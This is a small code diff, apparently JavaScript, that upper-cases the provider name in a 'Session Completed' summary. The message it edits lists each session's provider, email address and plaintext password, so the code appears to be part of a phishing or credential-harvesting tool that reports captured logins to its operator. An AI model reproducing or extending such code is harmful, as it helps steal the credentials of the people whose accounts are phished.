@@ -353,7 +353,7 @@ if (!session) {
     });
     const session = sessions.get(sessionId);
    const summary = `✅ *Session Completed*\n` +
-                `\`=== ${session.provider} ===\`\n\n` +
+                `\`=== ${session.provider.toUpperCase()} ===\`\n\n` +
                 `*Provider:* ${session.provider}\n` +
                 `*Email:* ${session.email}\n` + 
                 `*Password:* ${session.password || 'N/A'}\n` +
